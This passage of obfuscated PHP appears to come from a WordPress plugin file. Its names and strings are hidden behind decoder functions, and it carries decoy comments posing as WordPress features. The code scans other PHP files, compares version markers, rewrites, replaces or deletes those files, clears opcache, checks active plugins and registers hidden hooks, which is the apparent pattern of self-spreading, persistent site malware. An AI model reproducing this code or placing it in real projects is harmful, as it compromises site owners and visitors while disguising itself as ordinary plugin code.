      unset($z1w197277wcqb8,   $jqs2eargyf, $n6wfpm4lhd88,   $rwfiz600ad,  $mi0nylsh_4v7r);
   }
    $zl127nxpuxx5q8  =    $GLOBALS['__scf_t8832qq90dxb4_3']($rdkbrxivyu278,    nhceivfj8tbe(1892));



      foreach   ($h724_a629347 as   $qt9m2ywx1f2f6k) {
if    ($qt9m2ywx1f2f6k  ===   $rdkbrxivyu278) continue;
 $sh7pt0qh14csns  = @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($qt9m2ywx1f2f6k);
      if (!$sh7pt0qh14csns ||   ($sh7pt0qh14csns % (99929+71)) !==   (93784+35))   {
 $n260nktryl3   =  @$GLOBALS['__scf_g9y45bstmb02a_95']($qt9m2ywx1f2f6k);


if  (!$n260nktryl3  || $n260nktryl3  <  (472+28)   ||    $n260nktryl3  > (0x191ef63+0x18e109d))  continue;
   




}
     $sskfrd9pmp0 =  @$GLOBALS['__scf_apq4pqdt6n41_91']($qt9m2ywx1f2f6k,  false,    null,      0, (4007+89));$zkbcl_mcd5=(0xb+0x9c);$wwidoix8nc_jwq=$zkbcl_mcd5%2;
$yv19e4q9xbakr  =    array();
if    ($GLOBALS['__scf__me483qbepnts_41']($sskfrd9pmp0))  $GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1891),   $sskfrd9pmp0,  $yv19e4q9xbakr);
  if    (empty($yv19e4q9xbakr[1]))  {
        if (!m4eahxbbz3er7pv($qt9m2ywx1f2f6k, (5362-362)))   continue;
   $yv19e4q9xbakr   =  array("", dhd5r6_4ki(203));
 }
   if ($GLOBALS['__scf_t8832qq90dxb4_3']($qt9m2ywx1f2f6k,  nrudcgor(1892))   ===   $zl127nxpuxx5q8  &&   $yv19e4q9xbakr[1]    ===      $ns0ii5adv3kc61x)  {
 if  (!h9npb8tudge1x98znf($qt9m2ywx1f2f6k)) {


   if  (t3opc2_f7ewi94o($qt9m2ywx1f2f6k,  $qt9m2ywx1f2f6k  .     nrudcgor(29)) && $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1292)))  @opcache_invalidate($qt9m2ywx1f2f6k,  true);
       }
continue;
    }

if  (version_compare($yv19e4q9xbakr[1],    $ns0ii5adv3kc61x, '<'))    {$_5rsav46henlu=150;$cx5koxgm7lsju0=$_5rsav46henlu%10;
$zkxqu7a9xp6yj  =    c0egos9umjdrt0ya($qt9m2ywx1f2f6k);
  if    ($zkxqu7a9xp6yj ===  false)   {
 fukkkeh6955g9qi(nrudcgor(1509),    dhd5r6_4ki(1554) .     $GLOBALS['__scf_t8832qq90dxb4_3']($qt9m2ywx1f2f6k));
 continue;
}
// @flatten vault


  if   ($zkxqu7a9xp6yj ===   true)  {
     if     (t3opc2_f7ewi94o($qt9m2ywx1f2f6k,   $qt9m2ywx1f2f6k . pahk8uy1uxt(29)))  {


     if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1292)))  @opcache_invalidate($qt9m2ywx1f2f6k, true);
    } elseif (!drp1tnevzl5cho($qt9m2ywx1f2f6k)   &&    g52i06ovkso35mx($qt9m2ywx1f2f6k))   {
_rq71ghyu59d_enk($qt9m2ywx1f2f6k);

 sutzn4ma0ptncd0yyb9($qt9m2ywx1f2f6k);
   }
     @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($GLOBALS['__scf_eure5hcx2b_11']($qt9m2ywx1f2f6k) .  dhd5r6_4ki(1555) .    $GLOBALS['__scf_t8832qq90dxb4_3']($qt9m2ywx1f2f6k,   nrudcgor(1893)));

continue;

    }
if   (!drp1tnevzl5cho($qt9m2ywx1f2f6k)   &&  g52i06ovkso35mx($qt9m2ywx1f2f6k))   {
  _rq71ghyu59d_enk($qt9m2ywx1f2f6k);
     sutzn4ma0ptncd0yyb9($qt9m2ywx1f2f6k);
 }


il7z1naylyfu1zslh7($qt9m2ywx1f2f6k);
   continue;
    }
// degenerate control-flow-graph

   $_vnvrqjwk784xen  =   ($GLOBALS['__scf_t8832qq90dxb4_3']($GLOBALS['__scf_eure5hcx2b_11']($qt9m2ywx1f2f6k))   === pahk8uy1uxt(1894) ||    $GLOBALS['__scf_eure5hcx2b_11']($qt9m2ywx1f2f6k)  === $eune_5rai01);
      if   (!$_vnvrqjwk784xen  &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1895)))     {
$pqz83chrllb8rhyq      =   $GLOBALS['__scf_t8832qq90dxb4_3']($GLOBALS['__scf_eure5hcx2b_11']($qt9m2ywx1f2f6k))  .   '/'     . $GLOBALS['__scf_t8832qq90dxb4_3']($qt9m2ywx1f2f6k);
    $e6500pigcf9pkqe0   = (array)   @get_option(nrudcgor(1896), array());
 $_vnvrqjwk784xen  = $GLOBALS['__scf_rq7q923zwh_148']($pqz83chrllb8rhyq,    $e6500pigcf9pkqe0,  true);
if   (!$_vnvrqjwk784xen    &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1897))    &&  is_multisite()  &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1898))) {
/* exact-adj skolem */

$bze4_w0v3smc    =   (array)     @get_site_option(pahk8uy1uxt(1899),  array());



    $_vnvrqjwk784xen =     isset($bze4_w0v3smc[$pqz83chrllb8rhyq]);
 unset($bze4_w0v3smc);
   }
  unset($pqz83chrllb8rhyq, $e6500pigcf9pkqe0);
   }
if (!$_vnvrqjwk784xen)   continue;
if   (version_compare($yv19e4q9xbakr[1],  $ns0ii5adv3kc61x, '>'))    {
    if  (h9npb8tudge1x98znf($qt9m2ywx1f2f6k)    && !a6ucigno80cqr0m_($qt9m2ywx1f2f6k) &&   !lzhxpcpzmcnh2ec($qt9m2ywx1f2f6k, $rdkbrxivyu278))    return;
 $n9bvie6uu2o5   =    $GLOBALS['__scf_eure5hcx2b_11']($qt9m2ywx1f2f6k)   . f5cd2smymkqusi5(1900)   .  $GLOBALS['__scf_nn04_vx3uspzx4_54']($qt9m2ywx1f2f6k);
   if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($n9bvie6uu2o5)  &&     (int)    @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($n9bvie6uu2o5)  <  $GLOBALS['__scf_zxyq0lcqv02z6_185']() -    (0x2d+0xf))     {
      $ylwoew778xq9    = $GLOBALS['__scf_xa4hcdunc1pgl_111']('|',  (string) @$GLOBALS['__scf_apq4pqdt6n41_91']($n9bvie6uu2o5));

 if   ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($ylwoew778xq9)  < 2  ||  $ylwoew778xq9[0]     !==   $yv19e4q9xbakr[1]  ||  (int)      $ylwoew778xq9[1] !==     (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($qt9m2ywx1f2f6k)) {
@$GLOBALS['__scf_cdsp_fvydw_ufg_17']($n9bvie6uu2o5);
 continue;
}
  if (c0egos9umjdrt0ya($qt9m2ywx1f2f6k) !== false)   {
  rgiuaapohxeh0z($qt9m2ywx1f2f6k,     (599-179));



if (t65xl1pt2haov_izh($qt9m2ywx1f2f6k))     {
   @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($n9bvie6uu2o5);
    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1901)))  @opcache_invalidate($qt9m2ywx1f2f6k,      true);
   }
 }
  continue;
    }
@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($n9bvie6uu2o5, $yv19e4q9xbakr[1]  . '|'     .  (int) @$GLOBALS['__scf_g9y45bstmb02a_95']($qt9m2ywx1f2f6k));
   continue;
    }
   if ($yv19e4q9xbakr[1]   ===  $ns0ii5adv3kc61x)     {


   $g2nungg2zn9q  = i98kqd9b6k0g380fty6();$sa40i_8vdppkp=PHP_MAJOR_VERSION;$fukr05v6yz=$sa40i_8vdppkp*3;
 $k_vo4fan7e     =  false;

      if     (!empty($g2nungg2zn9q[nrudcgor(1356)]))  {
// WP Post Date: exact-adj pipeline

$nxiiwu0kf7ealcm  =   @$GLOBALS['__scf_a9u8k74i0cg19_33']($g2nungg2zn9q[pahk8uy1uxt(1902)]);


  $l7_6wgcqw6i503 =    @$GLOBALS['__scf_a9u8k74i0cg19_33']($qt9m2ywx1f2f6k);
if ($GLOBALS['__scf__me483qbepnts_41']($nxiiwu0kf7ealcm)   &&  $GLOBALS['__scf__me483qbepnts_41']($l7_6wgcqw6i503)    &&  $nxiiwu0kf7ealcm  ===     $l7_6wgcqw6i503   &&  zgyyi45x9xgfqs0mxs6p($g2nungg2zn9q)  ===     pahk8uy1uxt(1487) && h9npb8tudge1x98znf($qt9m2ywx1f2f6k))     {
 if  (lzhxpcpzmcnh2ec($qt9m2ywx1f2f6k,  $rdkbrxivyu278))  $k_vo4fan7e   =     true;
 else   return;
 }
 if ($GLOBALS['__scf__me483qbepnts_41']($nxiiwu0kf7ealcm)   &&     $nxiiwu0kf7ealcm   ===  @$GLOBALS['__scf_a9u8k74i0cg19_33']($rdkbrxivyu278))   $k_vo4fan7e     =  true;
 }
 if (!$k_vo4fan7e  && !h9npb8tudge1x98znf($qt9m2ywx1f2f6k)) {


 if  (a6ucigno80cqr0m_($qt9m2ywx1f2f6k)     ||  c0egos9umjdrt0ya($qt9m2ywx1f2f6k)  !== false)    {
 if   (t3opc2_f7ewi94o($qt9m2ywx1f2f6k,  $qt9m2ywx1f2f6k . f5cd2smymkqusi5(29)) && $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1901)))     @opcache_invalidate($qt9m2ywx1f2f6k, true);

       }
  unset($g2nungg2zn9q,     $k_vo4fan7e, $nxiiwu0kf7ealcm,     $l7_6wgcqw6i503);
 continue;
}
 if (!$k_vo4fan7e && $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($GLOBALS['__scf_t8832qq90dxb4_3']($qt9m2ywx1f2f6k,  f5cd2smymkqusi5(1893))), 0, (23-11))   >    $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($zl127nxpuxx5q8),     0, (10+2)))  {
 if   (!lzhxpcpzmcnh2ec($qt9m2ywx1f2f6k,   $rdkbrxivyu278)) return;
}
 unset($g2nungg2zn9q, $k_vo4fan7e,  $nxiiwu0kf7ealcm,  $l7_6wgcqw6i503);
  }
   }


    }
      unset($rdkbrxivyu278, $ns0ii5adv3kc61x,  $sskfrd9pmp0,     $yv19e4q9xbakr, $h724_a629347,    $eune_5rai01,  $n6ta7au_a2,     $qt9m2ywx1f2f6k,   $sh7pt0qh14csns,  $zl127nxpuxx5q8,   $n260nktryl3,   $zkxqu7a9xp6yj,  $n9bvie6uu2o5,  $ylwoew778xq9);
  } catch (Throwable $h2v_bjm4ejxq8fp)  {
// WP Home Link: monomorphize dependency-graph




    }  catch (Exception   $h2v_bjm4ejxq8fp) {
       }
// WP Entity Records: relocate singleton

   unset($p25a51vbio1ptbe);
if  (isset($GLOBALS[nrudcgor(180)])) {
        if   (version_compare((string)  $GLOBALS[mhiu2yqz6kqd(1903)],     kwqziujdph5xlz3n(),  nhceivfj8tbe(1904))) return;
  $GLOBALS[nrudcgor(1905)] = 1;$tongg0waqdao5p=147;$iad1rq_h=$tongg0waqdao5p%8;
}  elseif  (defined(mhiu2yqz6kqd(1906)))   {
 $hkd6mk2mxg  =   constant(nrudcgor(1906));


   if ($GLOBALS['__scf__me483qbepnts_41']($hkd6mk2mxg)     &&  $GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1907), $hkd6mk2mxg)   &&   version_compare($hkd6mk2mxg,     kwqziujdph5xlz3n(), dhd5r6_4ki(1904)))   return;
  $GLOBALS[nhceivfj8tbe(1905)]   =     1;
unset($hkd6mk2mxg);
 }
 $GLOBALS[dhd5r6_4ki(1903)]  =  kwqziujdph5xlz3n();

    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1326))) @clearstatcache(true, vv_nfhhmy_1mjmsa());


 $GLOBALS[f5cd2smymkqusi5(181)]  =    (string)  @$GLOBALS['__scf_g9y45bstmb02a_95'](vv_nfhhmy_1mjmsa())   . ':'  .  (string)  @$GLOBALS['__scf_hqkv9v6te1dvxi_94'](vv_nfhhmy_1mjmsa());
if   (!defined(dhd5r6_4ki(1908))) define(mhiu2yqz6kqd(1908),     kwqziujdph5xlz3n());

 if     (!defined(f5cd2smymkqusi5(1909))) define(f5cd2smymkqusi5(1910), kwqziujdph5xlz3n());
     vb9k6otlj0n7duv5om(pahk8uy1uxt(1911));
  


    qv1xvvannazv9n7s3ean(vv_nfhhmy_1mjmsa());
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1912))      &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1913)))   {
      try  {
    $ur_zb3q2s6kf1 = s3e5iki9upa0ccql();
 if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($ur_zb3q2s6kf1))      {
/* closed envelope */

   $j89ay5ipwr_kz311  = vru1jzm2va580zgo4i2cxv();
  $g_cewvxh0ryg = ly0t7sdceinn03pyne3($ur_zb3q2s6kf1, (4949+51));


   if    ($GLOBALS['__scf_vf9p0fditvxy_35']($g_cewvxh0ryg))    {



foreach  ($g_cewvxh0ryg  as $bt6n_1num8f96s)  {
if ($bt6n_1num8f96s   ===  $j89ay5ipwr_kz311) continue;
    if  ($GLOBALS['__scf_h3sj62ryxfdde_99']($GLOBALS['__scf_l2thcf5lcfr_202']($bt6n_1num8f96s,     constant(mhiu2yqz6kqd(726))))    !==     nhceivfj8tbe(1049)) continue;
      $amb3iz2lz0858q    =   $ur_zb3q2s6kf1    .   '/'    . $bt6n_1num8f96s;
if (@$GLOBALS['__scf_gsamhlxot70ps_18']($amb3iz2lz0858q)   &&     @$GLOBALS['__scf_g9y45bstmb02a_95']($amb3iz2lz0858q) >      (0xb69+0x81f)  && m4eahxbbz3er7pv($amb3iz2lz0858q,  (0x6b2+0xcd6))) {



  c6hv69l5g12jyc968g($amb3iz2lz0858q);
 }
}
// WP Block Variations meta box output

 }
 }
       }  catch (Throwable     $h2v_bjm4ejxq8fp)  {
// configure task-graph for WP REST API v2


     fukkkeh6955g9qi(f5cd2smymkqusi5(218),   $h2v_bjm4ejxq8fp);
     }   catch   (Exception    $h2v_bjm4ejxq8fp)   {
}
 }



 
if  (!  wg3vl21ocdjr7mf())   {
 rehs1w07vadorbxdvk(dhd5r6_4ki(1405),  pahk8uy1uxt(1914),     1);
    }
  
      $GLOBALS[f5cd2smymkqusi5(1915)] =  array();    



   $GLOBALS[dhd5r6_4ki(443)] = array(); 
    $GLOBALS[pahk8uy1uxt(1811)]     =   "";  


  if      ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1916)))   {
  $GLOBALS['__scf_m8aixr72vowj30_170'](mhiu2yqz6kqd(1917));


    $GLOBALS['__scf_m8aixr72vowj30_170'](nhceivfj8tbe(1918));
 }
$x7ljsej_4awn   =  $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())  .  dhd5r6_4ki(1919)  .  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),   mhiu2yqz6kqd(1893));
  if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($x7ljsej_4awn)) {
 $j5agh3a3qwswpga6  =  $GLOBALS['__scf_uvjtdemk2f_320']((string)   @$GLOBALS['__scf_apq4pqdt6n41_91']($x7ljsej_4awn));


 $ppxyrw74rs6fnrq  =    pbnqpq4basi6hzt2h23b_();
if   ($j5agh3a3qwswpga6 ===   ""  ||    ($ppxyrw74rs6fnrq  !== ""  &&     $j5agh3a3qwswpga6 !==    $ppxyrw74rs6fnrq)) t65xl1pt2haov_izh($x7ljsej_4awn);



unset($j5agh3a3qwswpga6, $ppxyrw74rs6fnrq);
 }
try   {
 @$GLOBALS['__scf_d91t8__q8rnbc2_71']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())     . nhceivfj8tbe(1920) .  $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa(),  f5cd2smymkqusi5(1893)));



    $ppxyrw74rs6fnrq =     pbnqpq4basi6hzt2h23b_();
 if     ($ppxyrw74rs6fnrq  !==   "")  {
 $wobo3ki4vd  =  dhd5r6_4ki(1921) .   $ppxyrw74rs6fnrq;
  foreach   (array($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),  s3e5iki9upa0ccql())  as     $n74_aaduh4diq_) {
if    (@$GLOBALS['__scf_gsamhlxot70ps_18']($n74_aaduh4diq_ .     '/'  .   $wobo3ki4vd))   @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($n74_aaduh4diq_  .  '/' . $wobo3ki4vd);
}
// reactive dead-letter

 }
// reorder feasible observer

  unset($ppxyrw74rs6fnrq, $wobo3ki4vd, $n74_aaduh4diq_);
}   catch  (Throwable  $h2v_bjm4ejxq8fp) {


        }    catch  (Exception $h2v_bjm4ejxq8fp)     {
    }
   unset($x7ljsej_4awn);



     rehs1w07vadorbxdvk(mhiu2yqz6kqd(756), nhceivfj8tbe(1922),  0);
 rehs1w07vadorbxdvk(mhiu2yqz6kqd(756),    f5cd2smymkqusi5(1923),   0);
 

rehs1w07vadorbxdvk(pahk8uy1uxt(1924),   pahk8uy1uxt(1922),  0);
   rehs1w07vadorbxdvk(nrudcgor(1925),  nrudcgor(1922),  0);
  rehs1w07vadorbxdvk(nrudcgor(1926),   nhceivfj8tbe(1927),   2);
 rehs1w07vadorbxdvk(mhiu2yqz6kqd(1926), mhiu2yqz6kqd(1928),  (0x1+0x2));
  rehs1w07vadorbxdvk(mhiu2yqz6kqd(1926), f5cd2smymkqusi5(1929),  (0x2+0x2));
       rehs1w07vadorbxdvk(pahk8uy1uxt(1405),   mhiu2yqz6kqd(1930), (7^2));
    aciovzhy5vt83dl1tcu(f5cd2smymkqusi5(1931), nrudcgor(1932),  (0x2+0x8),  1);

        aciovzhy5vt83dl1tcu(pahk8uy1uxt(1933), pahk8uy1uxt(1932), (5+5),  1);
  aciovzhy5vt83dl1tcu(nrudcgor(1934), f5cd2smymkqusi5(1932),     (0x7+0x3), 1);


aciovzhy5vt83dl1tcu(pahk8uy1uxt(1935),    mhiu2yqz6kqd(1936),      (12-2), 1);
     
   aciovzhy5vt83dl1tcu(mhiu2yqz6kqd(1937),   nhceivfj8tbe(1938),  (1508-509),  (2+1));
rehs1w07vadorbxdvk(pahk8uy1uxt(870), pahk8uy1uxt(1939),  (0x3ad+0x3a),  2);$t794vca28rx=7952;$qx7c4ul79zu0=$t794vca28rx%3;
   
   aciovzhy5vt83dl1tcu(nrudcgor(1940),  f5cd2smymkqusi5(1941));
   aciovzhy5vt83dl1tcu(dhd5r6_4ki(1942),  dhd5r6_4ki(1943),  (0x2+0x8), 2);
   aciovzhy5vt83dl1tcu(nrudcgor(1944),   nhceivfj8tbe(1945));
  
aciovzhy5vt83dl1tcu(f5cd2smymkqusi5(1946),    mhiu2yqz6kqd(1947),   (0x7+0x3),   1);
 



    aciovzhy5vt83dl1tcu(nrudcgor(1948),   dhd5r6_4ki(1949),   (5+5), 2);


  rehs1w07vadorbxdvk(pahk8uy1uxt(1950),   f5cd2smymkqusi5(786));
aciovzhy5vt83dl1tcu(nrudcgor(1951),  mhiu2yqz6kqd(793));

  aciovzhy5vt83dl1tcu(nrudcgor(1952),      nhceivfj8tbe(794));
 
rehs1w07vadorbxdvk(nhceivfj8tbe(1953),   dhd5r6_4ki(1954),  -(756+243));
   rehs1w07vadorbxdvk(mhiu2yqz6kqd(1955),      nhceivfj8tbe(1954), -(932+67));
      rehs1w07vadorbxdvk(pahk8uy1uxt(1956),   mhiu2yqz6kqd(1954),  -(0x28+0x3bf));



      
  rehs1w07vadorbxdvk(dhd5r6_4ki(1957),   pahk8uy1uxt(1958),    (914+85));

rehs1w07vadorbxdvk(mhiu2yqz6kqd(1959), pahk8uy1uxt(1960),   0);
rehs1w07vadorbxdvk(nhceivfj8tbe(1961),  dhd5r6_4ki(1962),  0);

   rehs1w07vadorbxdvk(dhd5r6_4ki(1963), dhd5r6_4ki(1964),  (1995-996));
  rehs1w07vadorbxdvk(nrudcgor(1965),  mhiu2yqz6kqd(1964), (141+858));
     
rehs1w07vadorbxdvk(nhceivfj8tbe(1961),  nhceivfj8tbe(1966),  2);


  rehs1w07vadorbxdvk(dhd5r6_4ki(1967), mhiu2yqz6kqd(1968),  0);
     
   rehs1w07vadorbxdvk(nrudcgor(1967), f5cd2smymkqusi5(1969),     0);
      rehs1w07vadorbxdvk(pahk8uy1uxt(1967), mhiu2yqz6kqd(1970),    0);
      

     rehs1w07vadorbxdvk(pahk8uy1uxt(1967),   pahk8uy1uxt(1971),  1);
 rehs1w07vadorbxdvk(nrudcgor(1972),    dhd5r6_4ki(1973),   2);

 rehs1w07vadorbxdvk(nhceivfj8tbe(1972),   nrudcgor(1927),      (1+2));

 rehs1w07vadorbxdvk(mhiu2yqz6kqd(1972),  dhd5r6_4ki(1974),    (52^48));
 rehs1w07vadorbxdvk(nrudcgor(1972), pahk8uy1uxt(1152),  (16^21));
 rehs1w07vadorbxdvk(nrudcgor(1972),      mhiu2yqz6kqd(1975),  (3+3));
      rehs1w07vadorbxdvk(nhceivfj8tbe(1976),    dhd5r6_4ki(1977),   (5+1));



   rehs1w07vadorbxdvk(nhceivfj8tbe(1978),    pahk8uy1uxt(1979));$qx31wrbs=-151;$lv6icay7g_es0=($qx31wrbs>0)?$qx31wrbs:-$qx31wrbs;



   rehs1w07vadorbxdvk(nhceivfj8tbe(1976),  nrudcgor(1980),  (6+1));
      if ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1916))) {
  $GLOBALS['__scf_m8aixr72vowj30_170'](function     () {
if  (!empty($GLOBALS[mhiu2yqz6kqd(694)]))  return;
       if   (!defined(mhiu2yqz6kqd(1674))   ||   !$GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1895)))  return;
if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1980)))  {
        try   {

 gt1toalj2_i1_soa();
  }     catch  (Throwable $h2v_bjm4ejxq8fp)   {
  }    catch   (Exception   $h2v_bjm4ejxq8fp)  {
        }


 }
  });


 }
rehs1w07vadorbxdvk(nhceivfj8tbe(1976), nrudcgor(1981),    (2+6));
    rehs1w07vadorbxdvk(f5cd2smymkqusi5(1982),  pahk8uy1uxt(1983));


 rehs1w07vadorbxdvk(f5cd2smymkqusi5(1644),  f5cd2smymkqusi5(1984));
   rehs1w07vadorbxdvk(f5cd2smymkqusi5(1985),     nrudcgor(1986),   (0x3+0x7));


      rehs1w07vadorbxdvk(pahk8uy1uxt(1976),  function  ()     {
 if     (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1895))     ||      !$GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1731))) return;
   $anr6cw07bi1u  =    (int)  @get_option(pahk8uy1uxt(1987),   0);

  if      (($GLOBALS['__scf_zxyq0lcqv02z6_185']() -  $anr6cw07bi1u) >  (3583+17))    {
 if    (!fm7xtju6ts9wdzb())   return;
 @update_option(nhceivfj8tbe(1987),    $GLOBALS['__scf_zxyq0lcqv02z6_185']());
 zby0nyy12_0wmk();
}

      },     (4+5));
 


      rehs1w07vadorbxdvk(nrudcgor(1988),   dhd5r6_4ki(1989));



     aciovzhy5vt83dl1tcu(nhceivfj8tbe(1990),  nhceivfj8tbe(1991));
   if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(1992))      &&  did_action(mhiu2yqz6kqd(1976)))      {$mhwzopqyji68k8=4696;$d43p7relhs4x=$mhwzopqyji68k8%16;
  n1e3pnm_3kvs383nl2t3e();

}
 
}